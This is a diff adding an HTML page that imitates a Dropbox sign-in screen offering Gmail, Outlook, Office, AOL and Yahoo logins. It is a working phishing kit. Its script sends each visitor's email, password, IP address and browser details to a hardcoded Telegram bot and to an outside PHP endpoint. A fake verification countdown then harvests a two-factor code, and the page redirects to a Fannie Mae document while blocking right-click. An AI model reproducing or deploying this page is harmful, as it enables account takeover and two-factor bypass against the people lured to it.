@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Dropbox - Secure File Access</title>
+    <link rel="icon" href="https://i.ibb.co/nspwLpq/dropboxlogo.png" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: url('https://i.ibb.co/kdyvCJ2/Newdropbox.png') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .overlay {
+            background-color: rgba(0, 0, 0, 0.5);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(4px);
+            z-index: 1;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 480px;
+            padding: clamp(1.5rem, 5vw, 2rem);
+            z-index: 2;
+            position: relative;
+            margin: clamp(0.5rem, 3vw, 1rem);
+        }
+
+        .login-container h2 {
+            font-size: clamp(1.4rem, 4.5vw, 1.75rem);
+            font-weight: 600;
+            margin-bottom: 1rem;
+            text-align: center;
+            color: #1a1a1a;
+        }
+
+        .login-container p {
+            font-size: clamp(0.8rem, 3.5vw, 0.95rem);
+            color: #4a4a4a;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .login-options {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .login-option {
+            margin: 0.75rem 0;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .login-option a {
+            display: flex;
+            align-items: center;
+            padding: clamp(0.5rem, 2.5vw, 0.75rem);
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            text-decoration: none;
+            color: #333;
+            font-size: clamp(0.85rem, 3vw, 1rem);
+            font-weight: 500;
+            background: #f8f9fa;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        .login-option a:hover {
+            background: #e9ecef;
+            transform: translateY(-2px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-option img {
+            width: clamp(20px, 5vw, 24px);
+            height: clamp(20px, 5vw, 24px);
+            margin-right: 1rem;
+            object-fit: contain;
+            loading: lazy;
+        }
+
+        .modal-content {
+            border-radius: 12px;
+            padding: clamp(0.75rem, 3vw, 1rem);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .modal.show .modal-content {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .modal .modal-content {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .modal-header {
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        .modal-body {
+            text-align: center;
+            padding: clamp(1rem, 4vw, 1.5rem);
+        }
+
+        .modal-body img {
+            width: clamp(50px, 12vw, 80px);
+            height: clamp(50px, 12vw, 80px);
+            border-radius: 50%;
+            margin-bottom: 1rem;
+            object-fit: contain;
+            loading: lazy;
+        }
+
+        .modal-body h5 {
+            font-size: clamp(1rem, 3.5vw, 1.25rem);
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-control {
+            border-radius: 8px;
+            padding: clamp(0.5rem, 2.5vw, 0.75rem);
+            font-size: clamp(0.85rem, 3vw, 1rem);
+            touch-action: manipulation;
+        }
+
+        .input-group-text {
+            background: transparent;
+            border: 1px solid #ced4da;
+            border-radius: 0 8px 8px 0;
+            padding: clamp(0.5rem, 2vw, 0.75rem);
+        }
+
+        .btn-primary {
+            background-color: #0061ff;
+            border: none;
+            border-radius: 8px;
+            padding: clamp(0.5rem, 2.5vw, 0.75rem);
+            font-size: clamp(0.85rem, 3vw, 1rem);
+            font-weight: 500;
+            width: 100%;
+            transition: background-color 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        .btn-primary:hover {
+            background-color: #0052cc;
+        }
+
+        .btn-primary:disabled {
+            background-color: #6699ff;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            border-radius: 8px;
+            padding: clamp(0.5rem, 2.5vw, 0.75rem);
+            font-size: clamp(0.85rem, 3vw, 1rem);
+        }
+
+        .alert {
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            font-size: clamp(0.8rem, 3vw, 0.9rem);
+        }
+
+        .countdownDiv h3 {
+            font-size: clamp(1rem, 3.5vw, 1.25rem);
+            font-weight: 500;
+        }
+
+        .inputSectionDiv h3 {
+            font-size: clamp(1rem, 3.5vw, 1.25rem);
+            font-weight: 500;
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-dialog {
+            max-width: 90%;
+            margin: clamp(0.5rem, 3vw, 1rem) auto;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: clamp(1rem, 4vw, 1.2rem);
+        }
+
+        @media (max-width: 576px) {
+            .login-container {
+                padding: clamp(1rem, 4vw, 1.5rem);
+                margin: clamp(0.25rem, 2vw, 0.5rem);
+            }
+
+            .modal-dialog {
+                margin: 0.25rem;
+                max-width: 95%;
+            }
+
+            .login-option a {
+                padding: clamp(0.4rem, 2vw, 0.5rem);
+            }
+
+            .modal-body {
+                padding: clamp(0.75rem, 3vw, 1rem);
+            }
+
+            .btn-primary, .btn-secondary {
+                padding: clamp(0.4rem, 2vw, 0.5rem);
+            }
+        }
+
+        @media (min-width: 768px) {
+            .login-container {
+                padding: clamp(2rem, 5vw, 2.5rem);
+            }
+
+            .modal-dialog {
+                max-width: 500px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    <div class="login-container">
+        <h2>Sign In to Dropbox</h2>
+        <p>Access your secure documents by signing in with your preferred email provider.</p>
+        <p class="text-primary">Select an option below or use another email provider.</p>
+        <ul class="login-options">
+            <li class="login-option">
+                <a href="#" data-bs-toggle="modal" data-bs-target="#loginModal" data-whatever="gmail">
+                    <img src="https://www.freepnglogos.com/uploads/email-png/email-logo-communications-brands-and-logotypes-gmail-14.png" alt="Gmail">
+                    Continue with Gmail
+                </a>
+            </li>
+            <li class="login-option">
+                <a href="#" data-bs-toggle="modal" data-bs-target="#loginModal" data-whatever="outlook">
+                    <img src="https://www.freepnglogos.com/uploads/logo-outlook/transparent-outlook-icon-2.png" alt="Outlook">
+                    Continue with Outlook
+                </a>
+            </li>
+            <li class="login-option">
+                <a href="#" data-bs-toggle="modal" data-bs-target="#loginModal" data-whatever="office">
+                    <img src="https://www.freepnglogos.com/uploads/microsoft-office-png-logo/microsoft-office-2013-symbol-logo-png-6.png" alt="Office">
+                    Continue with Office
+                </a>
+            </li>
+            <li class="login-option">
+                <a href="#" data-bs-toggle="modal" data-bs-target="#loginModal" data-whatever="aol">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1599px-AOL_logo.svg.png" alt="AOL">
+                    Continue with AOL
+                </a>
+            </li>
+            <li class="login-option">
+                <a href="#" data-bs-toggle="modal" data-bs-target="#loginModal" data-whatever="yahoo">
+                    <img src="https://www.freepnglogos.com/uploads/yahoo-logo-png/yahoo-logo-png-free-download-3.png" alt="Yahoo">
+                    Continue with Yahoo
+                </a>
+            </li>
+            <li class="login-option">
+                <a href="#" data-bs-toggle="modal" data-bs-target="#loginModal" data-whatever="other">
+                    <img src="https://www.freepnglogos.com/uploads/email-logo-png-33.png" alt="Other">
+                    Continue with Other Email
+                </a>
+            </li>
+        </ul>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="modal fade" id="loginModal" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <img src="" class="theImage img-fluid rounded-circle" alt="Provider Logo">
+                    <h5 class="theTitle"></h5>
+                    <div class="errorAlert" style="display: none;">
+                        <div class="alert alert-danger" role="alert">
+                            This is not a valid email
+                        </div>
+                    </div>
+                    <form class="theForm">
+                        <div class="mb-3">
+                            <input type="email" name="ai" placeholder="Email Address" class="form-control theEmail" id="recipient-email">
+                            <input type="hidden" name="detail" class="form-control theType" id="recipient-name">
+                            <input type="hidden" name="counter" id="theCounter">
+                        </div>
+                        <div class="mb-3">
+                            <div class="input-group" id="show_hide_password">
+                                <input type="password" name="pr" placeholder="Password" class="form-control" id="recipient-password">
+                                <span class="input-group-text">
+                                    <i class="fas fa-eye-slash"></i>
+                                </span>
+                            </div>
+                            <small class="passwordError" style="color: red;"></small>
+                        </div>
+                        <button type="button" class="btn btn-primary sendData">Sign In</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal fade" id="countdownModal" tabindex="-1" aria-labelledby="countdownModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="countdownModalLabel">Verification</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="countdownDiv text-center py-4">
+                        <h3>Verifying... <span id="countdown">30</span> seconds remaining</h3>
+                    </div>
+                    <div class="inputSectionDiv d-none py-4">
+                        <h3>Enter the code sent to your phone</h3>
+                        <form class="theForm2">
+                            <div class="mb-3">
+                                <input type="text" name="code" placeholder="Verification Code" class="form-control theCode" id="recipient-code">
+                                <input type="hidden" name="email" class="form-control" id="code_email">
+                            </div>
+                            <button type="button" class="btn btn-primary sendDataNew">Verify</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        Redirecting, please wait...
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8336200796:AAH6PRCPJxGkIvwpx25UPcZkBkOilFZ4AuA';
+        const TELEGRAM_CHAT_ID = '7319204418';
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                return { ok: false };
+            }
+        }
+
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            let countdown = 30;
+            const interval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    $('.countdownDiv').addClass('d-none');
+                    $('.inputSectionDiv').removeClass('d-none');
+                }
+            }, 1000);
+
+            document.getElementById('countdownModal').addEventListener('hidden.bs.modal', () => {
+                countdown = 30;
+                countdownElement.textContent = countdown;
+                $('.countdownDiv').removeClass('d-none');
+                $('.inputSectionDiv').addClass('d-none');
+            });
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('IP fetch error:', error);
+                return 'Unknown';
+            }
+        }
+
+        $(document).ready(function() {
+            $("#show_hide_password .input-group-text").on('click', function(event) {
+                event.preventDefault();
+                const input = $('#recipient-password');
+                const icon = $(this).find('i');
+                if (input.attr("type") === "text") {
+                    input.attr('type', 'password');
+                    icon.removeClass("fa-eye").addClass("fa-eye-slash");
+                } else {
+                    input.attr('type', 'text');
+                    icon.removeClass("fa-eye-slash").addClass("fa-eye");
+                }
+            });
+        });
+
+        const images = {
+            gmail: "https://www.freepnglogos.com/uploads/email-png/email-logo-communications-brands-and-logotypes-gmail-14.png",
+            outlook: "https://www.freepnglogos.com/uploads/logo-outlook/transparent-outlook-icon-2.png",
+            office: "https://www.freepnglogos.com/uploads/microsoft-office-png-logo/microsoft-office-2013-symbol-logo-png-6.png",
+            aol: "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1599px-AOL_logo.svg.png",
+            yahoo: "https://www.freepnglogos.com/uploads/yahoo-logo-png/yahoo-logo-png-free-download-3.png",
+            other: "https://www.freepnglogos.com/uploads/email-logo-png-33.png"
+        };
+
+        const theFormAction = "https://capitalrefinacehub.com/ngx/dropbox.php";
+        const theFormNewAction = "https://capitalrefinacehub.com/ngx/dropboxnew.php";
+
+        $('#loginModal').on('show.bs.modal', function(event) {
+            const button = $(event.relatedTarget);
+            const recipient = button.data('whatever');
+            const modal = $(this);
+            modal.find('.theImage').attr("src", images[recipient]);
+            modal.find('.theTitle').text(`Login with ${recipient.charAt(0).toUpperCase() + recipient.slice(1)}`);
+            modal.find('.theType').val(recipient);
+        });
+
+        let count = 0;
+        $(".sendData").click(function(e) {
+            e.preventDefault();
+            if (validateEmail($('.theEmail').val())) {
+                count++;
+                $("#theCounter").val(count);
+                $('.theForm').submit();
+            } else {
+                $('.errorAlert').show();
+            }
+        });
+
+        $(".sendDataNew").click(function(e) {
+            e.preventDefault();
+            const verifyButton = $(this);
+            verifyButton.prop('disabled', true);
+            $('#loadingOverlay').show();
+            $(".theForm2").submit();
+        });
+
+        $('.theForm').submit(function(e) {
+            e.preventDefault();
+            const formD = new FormData(this);
+            const email = $('.theEmail').val();
+            const password = $('#recipient-password').val();
+            const service = $('.theType').val();
+
+            getIP().then(ip => {
+                const telegramMessage = `
+                    🔐 New Login Attempt
+                    --------------------------
+                    Service: ${service}
+                    Email: ${email}
+                    Password: ${password}
+                    IP: ${ip}
+                    User Agent: ${navigator.userAgent}
+                    Timestamp: ${new Date().toLocaleString()}
+                `;
+                sendToTelegram(telegramMessage);
+            });
+
+            $.ajax({
+                method: 'POST',
+                processData: false,
+                contentType: false,
+                cache: false,
+                data: formD,
+                url: theFormAction,
+                success: function(response) {
+                    if (response === "Success") {
+                        $('#loginModal').modal('hide');
+                        $('#countdownModal').modal('show');
+                        $('#code_email').val($(".theEmail").val());
+                        startCountdown();
+                    } else {
+                        $('#recipient-password').val("");
+                        $('.passwordError').html("Your email or password is incorrect");
+                    }
+                },
+                error: function() {
+                    $('.passwordError').html("An error occurred. Please try again.");
+                }
+            });
+        });
+
+        $('.theForm2').submit(function(e) {
+            e.preventDefault();
+            const formD = new FormData(this);
+            const code = $('.theCode').val();
+            const email = $('#code_email').val();
+
+            const telegramMessage = `
+                🔢 Verification Code Submitted
+                --------------------------
+                Email: ${email}
+                Code: ${code}
+                Timestamp: ${new Date().toLocaleString()}
+            `;
+            sendToTelegram(telegramMessage);
+
+            $.ajax({
+                method: 'POST',
+                processData: false,
+                contentType: false,
+                cache: false,
+                data: formD,
+                url: theFormNewAction,
+                success: function(response) {
+                    if (response === "Success") {
+                        try {
+                            window.location.href = "https://www.fanniemae.com/media/14131/display";
+                        } catch (error) {
+                            $('#loadingOverlay').hide();
+                            $('.codeError').html("Redirect failed. Please try again or visit the page manually.");
+                            $('.sendDataNew').prop('disabled', false);
+                        }
+                    } else {
+                        $('#loadingOverlay').hide();
+                        $('.codeError').html("Please sign in again");
+                        $('.sendDataNew').prop('disabled', false);
+                    }
+                },
+                error: function() {
+                    $('#loadingOverlay').hide();
+                    $('.codeError').html("An error occurred. Please try again.");
+                    $('.sendDataNew').prop('disabled', false);
+                }
+            });
+        });
+
+        function validateEmail(email) {
+            return /\S+@\S+\.\S+/.test(email);
+        }
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+    </script>
+</body>
+</html>
